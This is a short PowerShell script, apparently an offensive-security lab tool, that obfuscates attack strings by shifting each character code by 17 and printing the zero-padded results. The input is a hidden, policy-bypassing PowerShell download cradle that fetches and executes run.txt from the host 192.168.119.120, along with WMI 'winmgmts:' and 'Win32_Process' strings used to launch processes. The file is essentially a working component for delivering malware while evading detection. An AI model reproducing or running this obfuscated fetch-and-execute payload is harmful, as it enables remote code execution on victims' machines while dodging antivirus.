$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
$payload1 = "winmgmts:"
$payload2 = "Win32_Process"

[string]$output = ""
[string]$output1 = ""
[string]$output2 = ""

$payload.ToCharArray() | %{
  [string]$thischar = [byte][char]$_ + 17
  if($thischar.Length -eq 1){
    $thischar = [string]"00" + $thischar
    $output += $thischar
    }
    elseif($thischar.Length -eq 2){
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3){
        $output += $thischar
    }
}

$payload1.ToCharArray() | %{
  [string]$thischar = [byte][char]$_ + 17
  if($thischar.Length -eq 1){
    $thischar = [string]"00" + $thischar
    $output1 += $thischar
    }
    elseif($thischar.Length -eq 2){
        $thischar = [string]"0" + $thischar
        $output1 += $thischar
    }
    elseif($thischar.Length -eq 3){
        $output1 += $thischar
    }
}


$payload2.ToCharArray() | %{
  [string]$thischar = [byte][char]$_ + 17
  if($thischar.Length -eq 1){
    $thischar = [string]"00" + $thischar
    $output2 += $thischar
    }
    elseif($thischar.Length -eq 2){
        $thischar = [string]"0" + $thischar
        $output2 += $thischar
    }
    elseif($thischar.Length -eq 3){
        $output2 += $thischar
    }
}


echo "Output A" + $output 
echo "Output B" + $output1 
echo "Output C" + $output2 
